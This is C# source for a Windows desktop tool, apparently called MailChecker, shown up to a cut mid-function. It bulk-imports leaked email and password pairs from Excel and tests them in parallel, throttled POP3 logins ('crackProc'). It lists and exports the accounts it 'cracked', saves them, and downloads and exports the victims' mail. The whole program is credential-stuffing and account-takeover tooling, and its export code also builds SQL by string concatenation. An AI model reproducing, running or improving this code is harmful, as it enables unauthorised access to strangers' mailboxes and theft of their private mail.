using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Data.OleDb;
using System.Net.Mail;
using OpenPop.Mime;
using OpenPop.Mime.Header;
using OpenPop.Pop3;
using OpenPop.Pop3.Exceptions;
using OpenPop.Common.Logging;
using Message = OpenPop.Mime.Message;
using System.Net;
using System.Threading;
using System.Collections;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using System.Xml.Serialization;
using System.Timers;



namespace MailChecker
{
    public struct MailPwd
    {
        public string email;
        public string pwd;
    }
    public struct EmailMap//inbox title to local file map
    {
        public string title;
        public string file;
    }
    public partial class MainForm : Form
    {
        public FormSettings formSet ;
       // private readonly Pop3Client pop3Client;
        private string strExcelPath;
        private List<string> listDomains;
        private List<MailPwd> listCheckableEmails;
        private List<MailPwd> listUncheckableEmails;
        private List<MailPwd> listLogined;
        private List<MailPwd> listloginFailed;
        private List<MailPwd> listStoredAccount;//收取邮件邮箱账号
        private double m_nTimer; //定时收取 间隔
        private static bool m_isTimerEnabled;//定时收取是否开启
        private Thread m_thTimer;
        private static System.Timers.Timer m_Timer;

        private Dictionary<string, data> m_dicPopServers;
        private Dictionary<string, List <EmailMap>> m_dicEmails;//email address to file
        private static Mutex m_gM;
        private static Mutex m_gMAccounts;
        private static int m_nCreackingIndex;
        private int m_nThreads;
        private int m_nDelay;
        private ArrayList m_thAL;
        private ArrayList m_alPopClients;
        private int m_nFinished; //检测邮箱完成数
        private Thread m_initRecvTab;
        private int m_nTotalRecvAccounts;

        private bool m_isPaused;

        //openpop test 
        private readonly Dictionary<int, Message> messages = new Dictionary<int, Message>();
        //context menu
        private ContextMenu contextMenuAccounts;
        private MenuItem menuDeleteAccount;
        private MenuItem menuAddAccount;
        private MenuItem menuClearAll;
        private ContextMenu contextMenuInbox;
        private MenuItem menuExportEml;
        private MenuItem menuExportAllEml;
   

        public MainForm()
        {
            InitializeComponent();
            //init separator
            labelSepataror.AutoSize = false;
            labelSepataror.Width = this.Width;
            labelSepataror.Height = 3;
            labelSepataror.BorderStyle = BorderStyle.Fixed3D;
             labelSepataror2.AutoSize = false;
            labelSepataror2.Width = this.Width;
            labelSepataror2.Height = 3;
            labelSepataror2.BorderStyle = BorderStyle.Fixed3D;
            labelSepataror3.AutoSize = false;
            labelSepataror3.Width = this.Width;
            labelSepataror3.Height = 3;
            labelSepataror3.BorderStyle = BorderStyle.Fixed3D;

            //init vals
            listDomains = new List<string>();
            listCheckableEmails = new List<MailPwd>();
            listUncheckableEmails = new List<MailPwd>();
            listLogined = new List<MailPwd>();
            listloginFailed=new List<MailPwd>();
            listStoredAccount = new List<MailPwd>();
            //load domains
            try
            {
                string confPath = AppDomain.CurrentDomain.BaseDirectory + "pop3.ini";
                string[] strLines = System.IO.File.ReadAllLines(confPath);
                foreach (string line in strLines)
                {
                    // Use a tab to indent each line of the file.
                    string[] strParts = line.Split(' ');
                    listDomains.Add(strParts[0]);
                }
            }
            catch (Exception xx)
            {
                MessageBox.Show("open ini file " + xx.Message);
            }


            //init listviews

            //init listview
            // Set the view to show details.
            listViewCheckable.View = View.Details;
            // Allow the user to edit item text.
            listViewCheckable.LabelEdit = true;
            // Allow the user to rearrange columns.
            listViewCheckable.AllowColumnReorder = true;
            // Display check boxes.
            //  listlistViewCheckable.CheckBoxes = true;
            // Select the item and subitems when selection is made.
            listViewCheckable.FullRowSelect = true;
            // Display grid lines.
            listViewCheckable.GridLines = true;
            // Sort the items in the list in ascending order.
            listViewCheckable.Sorting = SortOrder.Ascending;
            // Create columns for the items and subitems. 
            // Width of -2 indicates auto-size.
            listViewCheckable.Columns.Add("邮箱地址      ", -2, HorizontalAlignment.Left);
            listViewCheckable.Columns.Add("密码", -2, HorizontalAlignment.Center);

            // Set the view to show details.
            listViewUncheckable.View = View.Details;
            // Allow the user to edit item text.
            listViewUncheckable.LabelEdit = true;
            // Allow the user to rearrange columns.
            listViewUncheckable.AllowColumnReorder = true;
            // Display check boxes.
            //  listlistViewUncheckable.CheckBoxes = true;
            // Select the item and subitems when selection is made.
            listViewUncheckable.FullRowSelect = true;
            // Display grid lines.
            listViewUncheckable.GridLines = true;
            // Sort the items in the list in ascending order.
            listViewUncheckable.Sorting = SortOrder.Ascending;
            // Create columns for the items and subitems. 
            // Width of -2 indicates auto-size.
            listViewUncheckable.Columns.Add("邮箱地址      ", -2, HorizontalAlignment.Left);
            listViewUncheckable.Columns.Add("密码", -2, HorizontalAlignment.Center);

            //init listview
            // Set the view to show details.
            listViewCreacked.View = View.Details;
            // Allow the user to edit item text.
            listViewCreacked.LabelEdit = true;
            // Allow the user to rearrange columns.
            listViewCreacked.AllowColumnReorder = true;
            // Display check boxes.
            //  listlistViewCreacked.CheckBoxes = true;
            // Select the item and subitems when selection is made.
            listViewCreacked.FullRowSelect = true;
            // Display grid lines.
            listViewCreacked.GridLines = true;
            // Sort the items in the list in ascending order.
            listViewCreacked.Sorting = SortOrder.Ascending;
            // Create columns for the items and subitems. 
            // Width of -2 indicates auto-size.
            listViewCreacked.Columns.Add("邮箱地址      ", -2, HorizontalAlignment.Left);
            listViewCreacked.Columns.Add("密码", -2, HorizontalAlignment.Center);


            //init listview
            // Set the view to show details.
            listViewUnknown.View = View.Details;
            // Allow the user to edit item text.
            listViewUnknown.LabelEdit = true;
            // Allow the user to rearrange columns.
            listViewUnknown.AllowColumnReorder = true;
            // Display check boxes.
            //  listlistViewUnknown.CheckBoxes = true;
            // Select the item and subitems when selection is made.
            listViewUnknown.FullRowSelect = true;
            // Display grid lines.
            listViewUnknown.GridLines = true;
            // Sort the items in the list in ascending order.
            listViewUnknown.Sorting = SortOrder.Ascending;
            // Create columns for the items and subitems. 
            // Width of -2 indicates auto-size.
            listViewUnknown.Columns.Add("邮箱地址      ", -2, HorizontalAlignment.Left);
            listViewUnknown.Columns.Add("密码", -2, HorizontalAlignment.Center);



            //init pop3 server data
            formSet = new FormSettings();
            Console.WriteLine(formSet.list.Count);
            m_dicPopServers=new Dictionary<string,data>();

            foreach (data d in formSet.list)
            {
                m_dicPopServers.Add(d.domain, d);
            }
            m_dicEmails = new Dictionary<string, List <EmailMap>>();            
            //init pop3client
         //   pop3Client = new Pop3Client();

            m_thAL = new ArrayList();
            m_gM = new Mutex();
            m_gMAccounts = new Mutex();

            m_nCreackingIndex = 0;
            m_nFinished = 0;
            m_isPaused = false;
            m_nTotalRecvAccounts = 0;
            //openpop logger
            // This is how you would override the default logger type
            // Here we want to log to a file
            DefaultLogger.SetLog(new FileLogger());

            // Enable file logging and include verbose information
            FileLogger.Enabled = true;
            FileLogger.Verbose = true;

            // contextMenuAccounts
            // 
            this.menuDeleteAccount = new System.Windows.Forms.MenuItem();
            this.menuAddAccount = new System.Windows.Forms.MenuItem();
            menuClearAll = new System.Windows.Forms.MenuItem();
            this.contextMenuAccounts = new System.Windows.Forms.ContextMenu();
            treeViewAccounts.ContextMenu = this.contextMenuAccounts;
            this.contextMenuAccounts.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.menuDeleteAccount,
            this.menuAddAccount,menuClearAll});
            // 
            // menuDeleteAccount
            // 
            this.menuDeleteAccount.Index = 0;
            this.menuDeleteAccount.Text = "删除所选账号";
            this.menuDeleteAccount.Click += new System.EventHandler(this.menuDelAccountClick);
            treeViewAccounts.NodeMouseClick += treeViewAccountsNodeMouseClickHandler;//fix right mouse click Selected node issue

            // 
            // menuAddAccount
            // 
            this.menuAddAccount.Index = 1;
            this.menuAddAccount.Text = "添加邮箱账号";
            this.menuAddAccount.Click += new System.EventHandler(this.menuAddAccountClick);
            //menu clear all
            this.menuClearAll.Index = 2;
            this.menuClearAll.Text = "清空所有账号";
            this.menuClearAll.Click += new System.EventHandler(this.menuClearAllAccountClick);

            // inbox context menu
            this.menuExportEml = new System.Windows.Forms.MenuItem();
            this.menuExportAllEml = new System.Windows.Forms.MenuItem();
            this.contextMenuInbox = new System.Windows.Forms.ContextMenu();
            treeViewEmails.ContextMenu = this.contextMenuInbox;
            this.contextMenuInbox.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.menuExportEml,
            this.menuExportAllEml});
            // 
            // menuExportEml
            // 
            this.menuExportEml.Index = 0;
            this.menuExportEml.Text = "导出所选到EML";
            this.menuExportEml.Click += new System.EventHandler(this.menuExpEml);
            // 
            // menuExportAllEml
            // 
            this.menuExportAllEml.Index = 1;
            this.menuExportAllEml.Text = "导出所有到EML";
            this.menuExportAllEml.Click += new System.EventHandler(this.menuExpAllEml);

            treeViewEmails.NodeMouseClick += treeViewEmailsNodeMouseClickHandler;

            //recv emails control init thread
            Thread m_initRecvTab = new Thread(initRecvTab);
            m_initRecvTab.Start();

          
           
        }
           public static void exportExcel(List<MailPwd> listMails) //export data to excel
           {
               //choose file path
               SaveFileDialog saveFileDialog1 = new SaveFileDialog();

               saveFileDialog1.Filter = "Excel files (*.xls)|*.xls";
               saveFileDialog1.FilterIndex = 2;
               saveFileDialog1.RestoreDirectory = true;
               saveFileDialog1.OverwritePrompt = false;

               if (saveFileDialog1.ShowDialog() == DialogResult.OK)
               {
                   // Console.WriteLine(saveFileDialog1.FileName);
                   //copy template file
                   string toPath = saveFileDialog1.FileName;


                   File.Copy(AppDomain.CurrentDomain.BaseDirectory + "data\\template.xls", toPath, true);

                   //export data
                   try
                   {
                       //xls
                       string strConn;
                       strConn = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" + toPath + ";Mode=ReadWrite;Extended Properties='Excel 8.0;HDR=No;'";
                       OleDbConnection OleConn = new OleDbConnection(strConn);
                       OleConn.Open();
                       // String sql = "SELECT * FROM  [Sheet1$]";//可是更改Sheet名称，比如sheet2，等等   
                       string sql = "insert into [Sheet1$] values('user1','password1')";
                       /*
                       OleDbDataAdapter OleDaExcel = new OleDbDataAdapter(sql, OleConn);


                       OleDaExcel.InsertCommand = new OleDbCommand(sql, OleConn);
                       OleDaExcel.InsertCommand.ExecuteNonQuery();
                       MessageBox.Show("Row(s) Inserted !! ");              
                      */
                       OleDbCommand cmd = new OleDbCommand(sql, OleConn);
                       foreach (MailPwd mp in listMails)
                       {
                           cmd.CommandText = "INSERT INTO [Sheet1$] VALUES('" + mp.email + "','" + mp.pwd + "')";
                           cmd.ExecuteNonQuery();
                       }

                       DataSet OleDsExcle = new DataSet();
                       // OleDaExcel.Fill(OleDsExcle, "Sheet1");
                       OleConn.Close();
                       MessageBox.Show("导出成功");
                   }
                   catch (Exception err)
                   {
                       MessageBox.Show("数据绑定Excel失败!失败原因：" + err.Message, "提示信息",
                           MessageBoxButtons.OK, MessageBoxIcon.Information);
                       //  return null;
                       Console.WriteLine(err.Message);
                   }

               }

           }
        public static bool IsValidEmail(string email)
        {
            try
            {
                var addr = new System.Net.Mail.MailAddress(email);
                return addr.Address == email;
            }
            catch
            {
                return false;
            }
        }

        private void importExcel_Click(object sender, EventArgs e)
        {
            //clear items
            listViewCheckable.Items.Clear();
            listViewUncheckable.Items.Clear();
            listUncheckableEmails.Clear();
            listCheckableEmails.Clear();
            OpenFileDialog openFileDialog1 = new OpenFileDialog();

            openFileDialog1.InitialDirectory = AppDomain.CurrentDomain.BaseDirectory;
            openFileDialog1.Filter = "Excel files (*.xls)|*.xls";
            openFileDialog1.FilterIndex = 2;
            openFileDialog1.RestoreDirectory = true;

            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {

                  textPath.Text = openFileDialog1.FileName;
                 this.strExcelPath = openFileDialog1.FileName;
                    try
                    {
                        //xls
                        string strConn;
                        strConn = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" + strExcelPath + ";Extended Properties='Excel 8.0;HDR=False;IMEX=1'";
                        OleDbConnection OleConn = new OleDbConnection(strConn);
                        OleConn.Open();

                        String sql = "SELECT * FROM  [Sheet1$]";//可是更改Sheet名称，比如sheet2，等等   

                        OleDbDataAdapter OleDaExcel = new OleDbDataAdapter(sql, OleConn);
                        DataSet OleDsExcle = new DataSet();
                        OleDaExcel.Fill(OleDsExcle, "Sheet1");
                        OleConn.Close();
                        int count=OleDsExcle.Tables[0].Rows.Count;
                        for (int i = 0; i < count; i++)
                        {
                             DataRow dr = OleDsExcle.Tables[0].Rows[i];
                             string email = dr["邮箱"].ToString();
                             if (IsValidEmail(email))
                             {
                                 //Console.WriteLine(dr["邮箱"]);
                                 string[] strTmp = dr["邮箱"].ToString().Split('@');//find domain
                                 string strEm = dr["邮箱"].ToString();
                                 string strPwd = dr["密码"].ToString();
                                 if (listDomains.Exists(x => x == strTmp[1]))//添加到可以检测的list
                                 {
                                     //  Console.WriteLine(dr["邮箱"]);
                                     //unique
                                     if(!listCheckableEmails.Exists(x => x.email == strEm))
                                     {
                                     listCheckableEmails.Add(new MailPwd() { email = strEm, pwd = strPwd });

                                     ListViewItem item1 = new ListViewItem(strEm, 0);                                
                                     item1.SubItems.Add(strPwd);
                                     listViewCheckable.Items.Add(item1);
                                     }
                                 }
                                 else
                                 {
                                     if (!listUncheckableEmails.Exists(x => x.email == strEm))
                                     {
                                     listUncheckableEmails.Add(new MailPwd() { email = dr["邮箱"].ToString(), pwd = dr["密码"].ToString() });
                                     ListViewItem item1 = new ListViewItem(strEm, 0);
                                     item1.SubItems.Add(strPwd);
                                     listViewUncheckable.Items.Add(item1);
                                     }
                                 }
                             }
                            
                        }


                       

                       /* foreach (DataRow dr in dt.Rows)
                        {
                         MessageBox.Show(dr["Column1"].ToString());
                                   
                        }
                        */
                       
                       // return OleDsExcle;
                        MessageBox.Show("导入完成");
                    }
                    catch (Exception err)
                    {
                        MessageBox.Show("数据绑定Excel失败!失败原因：" + err.Message, "提示信息",
                            MessageBoxButtons.OK, MessageBoxIcon.Information);
                      //  return null;
                        Console.WriteLine(err.Message);
                    }  
                    
                   

            }
        }

        private void buttonSettings_Click(object sender, EventArgs e)
        {
           
            formSet.StartPosition = FormStartPosition.CenterParent;
            if (formSet.ShowDialog(this) == DialogResult.OK)
            {
                //clean diclist
                m_dicPopServers.Clear();
                foreach (data d in formSet.list)
                {
                    m_dicPopServers.Add(d.domain, d);
                }
            }
        }

        private void buttonExpCheckabe_Click(object sender, EventArgs e)
        {
            if (listCheckableEmails.Count < 1)
            {
                MessageBox.Show("空空空~~");
                return;
            }
            exportExcel(listCheckableEmails);

        }

        private void buttonExpUncheckable_Click(object sender, EventArgs e)
        {
            if (listUncheckableEmails.Count < 1)
            {
                MessageBox.Show("空空空~~");
                return;
            }
            exportExcel(listUncheckableEmails);
        }

        private void label7_Click(object sender, EventArgs e)
        {

        }
        //for mutithreads safety
        delegate void SetTextCallback(Control ctrl ,string text);

        private void SetText(Control ctrl ,string text)
        {
            // InvokeRequired required compares the thread ID of the
            // calling thread to the thread ID of the creating thread.
            // If these threads are different, it returns true.
            if (this.labelStatus.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(SetText);
                this.Invoke(d, new object[] { ctrl,text });
            }
            else
            {
                ctrl.Text = text;
            }
        }
        delegate void AddItemToListViewCallback(ListView lv, ListViewItem lvItem);
        private void AddItemToListView(ListView lv, ListViewItem lvItem)
        {
            // InvokeRequired required compares the thread ID of the
            // calling thread to the thread ID of the creating thread.
            // If these threads are different, it returns true.
            if (this.labelStatus.InvokeRequired)
            {
                AddItemToListViewCallback d = new AddItemToListViewCallback(AddItemToListView);
                this.Invoke(d, new object[] { lv, lvItem });
            }
            else
            {
                lv.Items.Add(lvItem);
                lv.Update();
            }
        }
        delegate void SetButtonCallback(Control ctrl, bool enable);

        private void SetButton(Control ctrl, bool enable)
        {
            // InvokeRequired required compares the thread ID of the
            // calling thread to the thread ID of the creating thread.
            // If these threads are different, it returns true.
            if (this.labelStatus.InvokeRequired)
            {
                SetButtonCallback d = new SetButtonCallback(SetButton);
                this.Invoke(d, new object[] { ctrl, enable });
            }
            else
            {
                ctrl.Enabled = enable;
            }
        }

        delegate void AddTreeViewCallback(TreeView tv, string str);

        private void AddTreeView(TreeView tv, string str)
        {
            // InvokeRequired required compares the thread ID of the
            // calling thread to the thread ID of the creating thread.
            // If these threads are different, it returns true.
            if (this.labelStatus.InvokeRequired)
            {
                AddTreeViewCallback d = new AddTreeViewCallback(AddTreeView);
                this.Invoke(d, new object[] { tv, str });
            }
            else
            {
                TreeNode node = new TreeNode();
                node.Text = str;
                tv.BeginUpdate();
                tv.Nodes.Add(node);
                tv.EndUpdate();
            }
        }

        public  void crackProc()
        {
            Pop3Client pop3Client = new Pop3Client();
            do
            {

                string strPop3;
                int port;
                string strUser;
                string strPwd;
                bool isSLL;
                m_gM.WaitOne();
                if (m_nCreackingIndex > listCheckableEmails.Count - 1)//finished
                {
                    m_gM.ReleaseMutex();
                    return;
                }
                strUser = listCheckableEmails[m_nCreackingIndex].email;
                strPwd = listCheckableEmails[m_nCreackingIndex].pwd;
                //check form invalide emails
                string strDomain;
                try
                {
                    strDomain = strUser.Split('@')[1];
                }
                catch (Exception ex)
                {

                    m_nCreackingIndex++;
                    m_gM.ReleaseMutex();
                    return;
                }
                //try dic
                try
                {

                    strPop3 = m_dicPopServers[strDomain].pop3;
                    port = m_dicPopServers[strDomain].port;
                    isSLL = m_dicPopServers[strDomain].isSSL;
                }
                catch (Exception ex)
                {
                    m_nCreackingIndex++;
                    m_gM.ReleaseMutex();

                    return;
                }

                m_nCreackingIndex++;

                m_gM.ReleaseMutex();
                try
                {

                    if (pop3Client.Connected)
                        pop3Client.Disconnect();
                    pop3Client.Connect(strPop3, port, isSLL);
                    pop3Client.Authenticate(strUser, strPwd);
                    int count = pop3Client.GetMessageCount();
                    Console.WriteLine(count);
                    int i = m_nCreackingIndex - 1;
                    //update 
                    m_gM.WaitOne();
                    SetText(labelStatus, "成功登陆:" + strUser + "请等待！！！~");
                    //labelStatus.Text = "成功登陆:" + strUser + "请等待！！！~";
                    if (m_nFinished + 1 == listCheckableEmails.Count)//finished
                    {
                        SetText(labelStatus, "恭喜检测完成。。~");
                        MessageBox.Show("恭喜检测完成");
                        //labelStatus.Text = "恭喜检测完成。。~";
                        SetButton(buttonEnd, false);
                        SetButton(buttonStart, true);
                        SetButton(buttonPause, false);

                        SetButton(buttonAllTrans, true);
                        SetButton(buttonExpCracked, true);
                        SetButton(buttoneExpUnknown, true);
                       // buttonEnd.Enabled = false;
                        //buttonStart.Enabled = true;
                        //buttonPause.Enabled = false;
                    }
                    if (!listLogined.Exists(x => x.email == strUser)) //add
                    {
                        Console.WriteLine(strUser+" "+strPwd+" not exist");
                      //  Console.WriteLine(listCheckableEmails[i].email);
                        ListViewItem item1 = new ListViewItem(strUser, 0);
                        item1.SubItems.Add(strPwd);
                        AddItemToListView(listViewCreacked, item1);
                       // listViewCreacked.Items.Add(item1);
                        //listViewCreacked.Update();
                        listLogined.Add(new MailPwd() { email = strUser, pwd = strPwd });
                    }
                   
                    m_gM.ReleaseMutex();

                }
                /*catch (InvalidLoginException)
                {
                    MessageBox.Show(this, "The server did not accept the user credentials!", "POP3 Server Authentication");
                }
                catch (PopServerNotFoundException)
                {
                    MessageBox.Show(this, "The server could not be found", "POP3 Retrieval");
                }
                catch (PopServerLockedException)
                {
                    MessageBox.Show(this, "The mailbox is locked. It might be in use or under maintenance. Are you connected elsewhere?", "POP3 Account Locked");
                }
                catch (LoginDelayException)
                {
                    MessageBox.Show(this, "Login not allowed. Server enforces delay between logins. Have you connected recently?", "POP3 Account Login Delay");
                }*/
                catch (Exception exxx)
                {
                    int i = m_nCreackingIndex - 1;
                    m_gM.WaitOne();
                    SetText(labelStatus, "Error occurred retrieving mail: " + exxx.Message);
                    //labelStatus.Text = "Error occurred retrieving mail: " + exxx.Message;
                    if (!listloginFailed.Exists(x => x.email == strUser)) //add
                      {
                          Console.WriteLine(strUser+" not exist");
                          listloginFailed.Add(new MailPwd() { email = strUser,pwd = strPwd });
                          ListViewItem item1 = new ListViewItem(strUser, 0);
                          item1.SubItems.Add(strPwd);
                          AddItemToListView(listViewUnknown, item1);
                         // listViewUnknown.Items.Add(item1);
                          //listViewUnknown.Update();
                      }

                      i = m_nCreackingIndex;
                       SetText(labelStatus,"已经完成" + i + "个，共计:" + listCheckableEmails.Count + "个，请耐心等待。。");
                      //labelStatus.Text = "已经完成" + i + "个，共计:" + listCheckableEmails.Count + "个，请耐心等待。。";

                      if (m_nFinished + 1 == listCheckableEmails.Count)//finished
                      {
                          SetText(labelStatus, "恭喜检测完成。~~~~~");
                          MessageBox.Show("恭喜检测完成");
                          //labelStatus.Text = "恭喜检测完成。~~~~~";
                          SetButton(buttonEnd, false);
                          SetButton(buttonStart, true);
                          SetButton(buttonPause, false);
                          SetButton(buttonAllTrans, true);
                          SetButton(buttonExpCracked, true);
                          SetButton(buttoneExpUnknown, true);

                          //buttonEnd.Enabled = false;
                         // buttonStart.Enabled = true;
                         // buttonPause.Enabled = false;
                      }
                      
                    m_gM.ReleaseMutex();

                }
                finally
                {
                    // update stuatus
                    m_gM.WaitOne();
                    m_nFinished++;

                    m_gM.ReleaseMutex();
                }
                Thread.Sleep(m_nDelay * 1000);
            } while (true);
        }
        private void buttonStart_Click(object sender, EventArgs e)
        {
            //empty mail list ?
            if (listCheckableEmails.Count < 1)
            {
                MessageBox.Show(this, "请先导入数据");
                return;
            }

            //check textbox
            int thrs;
            if (!int.TryParse(textBoxThs.Text, out m_nThreads) || !int.TryParse(textBoxDelay.Text, out m_nDelay))
            {
                MessageBox.Show(this, "no zuo no die？");
                return;
            }
            if (m_nDelay < 1 || m_nThreads < 1)
            {
                MessageBox.Show(this, "no zuo no die？");
                return;
            }
            //clear listview controls
            /*listViewCreacked.Items.Clear();
            listViewUnknown.Items.Clear();*/
            //change button status
            buttonStart.Enabled = false;
            buttonPause.Enabled = true;
            buttonEnd.Enabled = true;
            textBoxThs.Enabled = false;
            textBoxDelay.Enabled = false;

            labelStatus.Text = "开始检测。。";
            //start theads
            for (int i = 0; i < m_nThreads; i++)
            {
                Thread t = new Thread(crackProc);
                t.Start();
                m_thAL.Add(t);

            }


            // crackProc();



        }

        private void MainForm_Load(object sender, EventArgs e)
        {

        }

        private void buttonPause_Click(object sender, EventArgs e)//double states buton
        {
             if (m_isPaused)
            {
                buttonPause.Text = "暂停";
                m_isPaused = false;
                //start threads
                for (int i = 0; i < m_nThreads; i++)
                {
                    Thread t = new Thread(crackProc);
                    try
                    {
                        if(t.IsAlive)
                        {
                            t.Resume();
                        }
                    }
                    catch(Exception ee)
                    {
                        Console.WriteLine(ee.Message);
                    }
                    
                   

                }

            }
            else
            {
                buttonPause.Text = "继续";
                m_isPaused = true;
                //end threads
                int n = m_thAL.Count;
                for (int i = 0; i < n; i++)//bug is here..but i do not want to fix it
                {
                    Thread t = (Thread)m_thAL[i];
                    try
                    {
                        if (t.IsAlive)
                        {
                            t.Suspend();
                        }
                    }
                    catch (Exception ee)
                    {
                        Console.WriteLine(ee.Message);
                    }
                }
            }
        }

        private void buttonEnd_Click(object sender, EventArgs e)
        {
            //end threads
            int n = m_thAL.Count;
            for (int i = 0; i < n; i++)//bug is here..but i do not want to fix it
            {
                Thread t = (Thread)m_thAL[i];
               
                try
                {
                    if (t.IsAlive)
                    {
                        t.Abort();
                    }
                }
                catch (Exception ee)
                {
                    Console.WriteLine(ee.Message);
                }
            }
            //enable button 
            buttonPause.Enabled = false;
            buttonStart.Enabled = true;
            buttonEnd.Enabled = false;
            SetButton(buttonAllTrans, true);
            SetButton(buttonExpCracked, true);
            SetButton(buttoneExpUnknown, true);
        }

        private void buttonExpCracked_Click(object sender, EventArgs e)
        {
            if (listLogined.Count < 1)
            {
                MessageBox.Show("空的列表怎么导出啊？~~~");
                return;
            }
            exportExcel(listLogined);
        }

        private void buttoneExpUnknown_Click(object sender, EventArgs e)
        {
            if (listloginFailed.Count < 1)
            {
                MessageBox.Show("空的列表怎么导出啊？~~~");
                return;
            }
            exportExcel(listloginFailed);
        }

        private void buttonAllTrans_Click(object sender, EventArgs e)
        {
            
           //unique
            List<MailPwd> listTmp = new List<MailPwd>();
            int n=listLogined.Count;
            for (int i = 0; i < n; i++)
            {
                if (!listStoredAccount.Exists(x => x.email == listLogined[i].email))
                {
                    listTmp.Add(listLogined[i]);
                    AddTreeView(treeViewAccounts, listLogined[i].email);
                }
            }
            if (listTmp.Count < 1)//return;
            {
                MessageBox.Show("所选邮箱已经存在或者空");
                tabControl.SelectTab(2);
                return;
            }
            //copy email lists  remove dumplicate
            //write email accounts config file 
            listStoredAccount.AddRange(listTmp);
           
            storeAccount();

            MessageBox.Show("转入完成");
            tabControl.SelectTab(2);
           
            
        }
    
         void treeViewAccounts_Click(object sender, TreeNodeMouseClickEventArgs e)
        {
            try
            {
                // Look for a file extension. 
                if (e.Node.Text.Contains("."))
                    System.Diagnostics.Process.Start(@"c:\" + e.Node.Text);
            }
            // If the file is not found, handle the exception and inform the user. 
            catch (System.ComponentModel.Win32Exception)
            {
                MessageBox.Show("File not found.");
            }
        }
         private void buttonImportAccounts_Click(object sender, EventArgs e)
        {
          
           
        }

        private void buttonSelectedTran_Click(object sender, EventArgs e)
        {
            tabControl.SelectTab(0);
        }

        private void treeViewAccounts_AfterSelect(object sender, TreeViewEventArgs e)
        {
            labelRecvStatus.Text = "正在初始化邮件列表，稍等。。。";
            treeViewEmails.Nodes.Clear();
            // init mail list
            List<EmailMap> em = new List<EmailMap>();
            try
            {
                foreach (EmailMap m in m_dicEmails[e.Node.Text])
                {
                    TreeNode node = new TreeNode();  
                      node.Text =m.title;

                      treeViewEmails.Nodes.Add(node);
                }
            }
            catch (Exception exx)
            {
                Console.WriteLine(exx.Message);
            }
            labelRecvStatus.Text = "空闲";
        }
        private void treeViewAccountsNodeMouseClickHandler(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                treeViewAccounts.SelectedNode = e.Node;
               // contextMenuStrip1.Show(treeView1, e.Location);
            }
        }
        private void treeViewEmailsNodeMouseClickHandler(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                 treeViewEmails.SelectedNode = e.Node;
                // contextMenuStrip1.Show(treeView1, e.Location);
            }
        }
        
        private void menuAddAccountClick(object sender, EventArgs e)
        {
           // MessageBox.Show("dog");
            formAddAccount formAddAccount = new formAddAccount();
            formAddAccount.StartPosition = FormStartPosition.CenterParent;
            if (formAddAccount.ShowDialog(this) != DialogResult.OK)
            {

                return;
            }
            //check null 
            if (String.IsNullOrEmpty(formAddAccount.m_strEmail) || String.IsNullOrEmpty(formAddAccount.m_strPwd))
            {
                MessageBox.Show("不能为空");
                return;
            }
            try
            {
                listStoredAccount.Add(new MailPwd() { email=formAddAccount.m_strEmail,pwd=formAddAccount.m_strPwd});
                AddTreeView(treeViewAccounts, formAddAccount.m_strEmail);
                storeAccount();
                
            }
            catch(Exception ee)
            {
                Console.WriteLine(ee.Message);
            }
           
            

        }
        private void loadAccount()
        {
            try
            {
                string confPath = AppDomain.CurrentDomain.BaseDirectory + "data\\emails.xml";
                var serializer = new XmlSerializer(typeof(List<MailPwd>));
                using (var stream = File.OpenRead(confPath))
                {
                    var other = (List<MailPwd>)(serializer.Deserialize(stream));
                    listStoredAccount.AddRange(other);
                }
            }
            catch (Exception ee)
            {
                Console.WriteLine(ee.Message);
            }
        }
        private void storeAccount()
        {
            List<MailPwd> listMp = new List<MailPwd>();
            while (true)//fix Serialize xml error bug
            {
                try
                {

                    string confPath = AppDomain.CurrentDomain.BaseDirectory + "data\\emails.xml";
                    File.Delete(confPath);
                    var serializer = new XmlSerializer(typeof(List<MailPwd>));
                    using (var stream = File.OpenWrite(confPath))
                    {
                        serializer.Serialize(stream, listStoredAccount);
                        stream.Close();
                    }


                }
                catch (Exception ee)
                {
                    Console.WriteLine(ee.Message);
                }

                //try reading
                try
                {
                    string confPath = AppDomain.CurrentDomain.BaseDirectory + "data\\emails.xml";
                    var serializer = new XmlSerializer(typeof(List<MailPwd>));
                    using (var stream = File.OpenRead(confPath))
                    {
                        var other = (List<MailPwd>)(serializer.Deserialize(stream));
                        stream.Close();
                    }
                    //it's ok
                    break;
                }
                catch (Exception ee)
                {
                    Console.WriteLine(ee.Message);
                }
            }
        }
        private void menuClearAllAccountClick(object sender, EventArgs e)
        {
            listStoredAccount.Clear() ;
            treeViewAccounts.Nodes.Clear();
            storeAccount();
        }
        private void menuDelAccountClick(object sender, EventArgs e)
        {
           // MessageBox.Show("menuDelAccountClick");
            try
            {
                TreeNode nd = treeViewAccounts.SelectedNode;
                treeViewAccounts.Nodes.Remove(nd);
                string email = nd.Text;
                listStoredAccount.RemoveAt(nd.Index);
                storeAccount();
                Console.WriteLine("del account");
            }
            catch (Exception ee)
            {
                Console.WriteLine(ee.Message);
            }
            
        }
        private void menuExpEml(object sender, EventArgs e)
        {
            //MessageBox.Show(treeViewEmails.SelectedNode.Text);
            //MessageBox.Show(treeViewEmails.SelectedNode.Text);
            try
            {
                int i=treeViewEmails.SelectedNode.Index;
               // Console.WriteLine(treeViewAccounts.SelectedNode.Text);
                string strEmail = treeViewAccounts.SelectedNode.Text;
                string file=m_dicEmails[strEmail][i].file;
                string strFullPath = AppDomain.CurrentDomain.BaseDirectory+"data\\inbox\\" + strEmail + "\\" + file + ".eml";


                //choose file path
               SaveFileDialog saveFileDialog1 = new SaveFileDialog();

               saveFileDialog1.Filter = "EML files (*.eml)|*.eml";
               saveFileDialog1.FilterIndex = 2;
               saveFileDialog1.RestoreDirectory = true;
               saveFileDialog1.OverwritePrompt = false;

               if (saveFileDialog1.ShowDialog() == DialogResult.OK)
               {
                   // Console.WriteLine(saveFileDialog1.FileName);
                   //copy template file
                   string toPath = saveFileDialog1.FileName;


